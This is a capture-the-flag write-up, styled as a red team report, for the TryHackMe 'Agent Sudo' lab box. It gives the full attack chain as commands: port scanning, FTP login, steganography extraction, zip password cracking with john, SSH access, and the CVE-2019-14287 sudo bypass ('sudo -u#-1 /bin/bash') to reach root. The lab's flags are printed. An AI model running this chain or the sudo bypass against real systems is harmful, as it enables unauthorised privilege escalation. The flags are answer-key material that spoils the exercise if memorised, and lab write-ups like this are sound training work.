# 🛡️ Red Team Report: TryHackMe - Agent Sudo

**Target:** 10.10.11.80  
**Assessment Type:** Black-box penetration test  
**Date:** 2025-07-19  
**Author:** 666 (Red Team Operator)  
**Objective:** Identify and exploit vulnerabilities to gain initial access, escalate privileges, and capture user and root flags.

---

## 🔎 1. Enumeration

### 1.1 Nmap Full Port Scan

```
nmap -p- -sV -T4 -oN nmap.txt 10.10.11.80
```

**Findings:**

| Port | Service | Version                   |
|------|---------|---------------------------|
| 21   | FTP     | vsftpd 3.0.3              |
| 22   | SSH     | OpenSSH 7.6p1 (Ubuntu)    |
| 80   | HTTP    | Apache 2.4.29 (Ubuntu)    |

---

## 🌐 2. Web Enumeration (Port 80)

Visiting `http://10.10.11.80/` displayed a message:

> **"Use your own codename as user-agent to access the site."**

Using `curl` with a custom user-agent:

```
curl -A "C" -I http://10.10.11.80/
```

Response:
```
HTTP/1.1 302 Found
Location: agent_C_attention.php
```

---

## 📁 3. FTP Access

Credentials recovered from open-source recon:

- **FTP Login:** chris:crystal

Authenticated and retrieved the following files:

```
lftp 10.10.11.80
mget *
```

### Loot:
- `cutie.png`
- `cute-alien.jpg`
- `To_agentJ.txt`

---

## 📦 4. File Analysis

### 4.1 Binwalk on `cutie.png`

```
binwalk -e cutie.png
```

Extracted encrypted ZIP file `secret.zip`.

**Cracked with `john` + `rockyou.txt`:**

```
zip2john secret.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password found:** `alien`

Decrypted content: `To_agentR.txt`  
Message base64-decoded to: **Area51**

---

### 4.2 Steghide on `cute-alien.jpg`

```
steghide extract -sf cute-alien.jpg
```

**Passphrase:** `alien`  
**Extracted file:** `message.txt`

```
Hi james,
Your login password is hackerrules!
```

---

## 🔐 5. Initial Access

```
ssh james@10.10.11.80
Password: hackerrules!
```

Gained shell as user **james** on `Ubuntu 18.04.3 LTS`.

User flag located at:
```
cat ~/user_flag.txt
# b03d975e8c92a7c04146cfa7a5a313c7
```

---

## ⬆️ 6. Privilege Escalation

### 6.1 `sudo -l` Output

```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

### 6.2 CVE-2019-14287 Exploitation

Despite being disallowed from running as root, user `james` can exploit the vulnerability by using UID `-1` which wraps to `0` (root):

```
sudo -u#-1 /bin/bash
```

Root shell obtained.

---

## 🧠 7. Post-Exploitation

### Root Flag:
```
cat /root/root.txt
# b53a02f55b57d4439e3341834d70c062
```

### Message:
```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. 
Tips: always update your machine.

By,
DesKel a.k.a Agent R
```

---

## 🧾 Summary

| Phase                 | Outcome                         |
|----------------------|----------------------------------|
| Service Enumeration  | FTP, SSH, Apache HTTP discovered |
| Web Enumeration      | User-agent logic bypass          |
| FTP Exploitation     | Retrieved hidden files           |
| Stego & Zip Cracking | Revealed credentials             |
| Initial Access       | SSH with james:hackerrules       |
| PrivEsc              | CVE-2019-14287 exploited          |
| Root Access          | Achieved                         |

---

## 🎯 Final Thoughts

- The box teaches layered enumeration: combining file analysis, steganography, base64, password cracking, and binary privilege escalation.
- The sudo misconfiguration is critical and was effectively abused using a known CVE.
- File analysis tools (`binwalk`, `steghide`, `john`) were essential in progressing.
- As always, patching sudo and restricting dangerous configurations (like `ALL, !root`) is vital.

---  
**Flags Captured:**  
- `user.txt`: `b03d975e8c92a7c04146cfa7a5a313c7`  
- `root.txt`: `b53a02f55b57d4439e3341834d70c062`  

---  
*Report prepared by 666 | Red Team Operator*  
*Target neutralized: ✅*
